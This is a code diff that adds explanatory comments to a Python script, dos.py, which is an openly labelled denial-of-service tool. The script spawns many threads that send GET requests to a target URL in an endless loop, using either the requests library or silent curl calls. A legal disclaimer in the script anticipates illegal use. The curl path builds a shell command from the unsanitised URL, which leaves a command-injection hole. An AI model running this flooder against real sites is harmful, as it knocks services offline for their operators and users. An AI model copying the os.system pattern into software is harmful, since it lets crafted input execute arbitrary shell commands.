@@ -1,48 +1,64 @@
-import threading
-from os import system
-from sys import argv, stderr
-import requests
-from os import _exit
+# IMPORTS
+import threading # multi-threading
+from os import system # execute curl
+from sys import argv, stderr # get arguments, and print to stderr
+import requests # for running get requests
+from os import _exit # for exiting and killing all child threads
 
+
+# FUNCTIONS
+
+# function to start threads
 def generate(url, thread_count, verbose, py):
-    if threading.active_count() < thread_count:
-        current_num = 1
-        print("Starting threads")
-        while True:
-            if threading.active_count() < thread_count:
-                threading.Thread(target=ping,args=(url, thread_count, verbose, py, current_num,)).start()
-                if verbose:
-                    print("New thread started:", str(threading.active_count()))
-                    current_num += 1
-            else:
-                break
+    current_num = 1 # variable to give threads IDs
+    print("Starting threads")
+    while True:
+        if threading.active_count() < thread_count: # executes if more threads are needed
+            threading.Thread(target=ping,args=(url, thread_count, verbose, py, current_num,)).start() # spawns thread
+            if verbose: # print information if verbose on
+                print("New thread started:", str(threading.active_count()))
+                current_num += 1
+        else:
+            break
     print("Pinging... (Press enter to stop)")
-    input()
-    _exit(0)
+    input() # pauses main thread's execution
+    _exit(0) # special exit to kill everything
 
+# target function for each thread
 def ping(url, thread_count, verbose, py, num):
     global ping_count
     while True:
-        if threading.active_count() == thread_count:
+        if threading.active_count() == thread_count: # wait until all threads are spawned
+
+            # using requests module
             if py:
                 try:
                     requests.get(url)
                 except requests.exceptions.MissingSchema:
                     print("Invalid URL", file=stderr)
                     _exit(1)
+
+            # using curl
             else:
-                system("curl " + url + " &> /dev/null")
+                system("curl " + url + " &> /dev/null") # redirect output to /dev/null (silent)
+
+            # print verbose information
             if verbose:
                 ping_count += 1
                 print("Thread pinged: " + url + " Total: " + str(ping_count) + " ID: " + str(num))
 
 
+# MAIN EXECUTION
 
+# exit with no arguments
 if len(argv) == 0:
     exit(0)
 
+# get first argument
 try:
     url = argv[1]
+
+    # help message
     if url == "--help" or url == "-h":
         print("""Usage:
     python dos.py [options] | [<destination> <# of threads> [flags]]
@@ -63,6 +79,7 @@ Press enter to stop, and kill all child threads
 by Theo Henson (GH: tteeoo/dos) <theodorehenson at protonmail dot com>""")
         exit(0)
 
+    # version information
     if url == "--version" or url == "-V":
         print('''                     
      #               
@@ -77,15 +94,18 @@ by Theo Henson (GH: tteeoo/dos) <theodorehenson at protonmail dot com>
 ''')
         exit(0)
 
+    # legal information
     if url == "--legal" or url == "-l":
         print("""In addition to the MIT License, this further legal disclosure applies:
 I (Theo Henson) am not responsible for the repercussions that you (a user of this software) may face through the illegal usage of this software, nor am I responsible for the damage that any user causes, using this software. By using this software, you take full responsibility, in other words, *use at your own risk*.""")
         exit(0)
 
+# error if no url is provided
 except IndexError:
     print("No URL provided", file=stderr)
     exit(1)
 
+# get thread count, and error out when necessary
 try:
     thread_count = int(argv[2]) + 1
 except IndexError:
@@ -95,15 +115,19 @@ except ValueError:
     print("Non-integer thread count provided", file=stderr)
     exit(1)
 
-ping_count = 0
+# set some variables
+ping_count = 0 # global variable to track ping count accross all threads
 verbose = False
 py = False
 
+# override verbose variable if options are provided
 if "-v" in argv or "--verbose" in argv:
     verbose = True
 
+# override python variable if options are provided
 if "-p" in argv or "--python" in argv:
     py = True
     print("Using built-in python requests module")
 
+# start generating threads
 generate(url, thread_count, verbose, py)
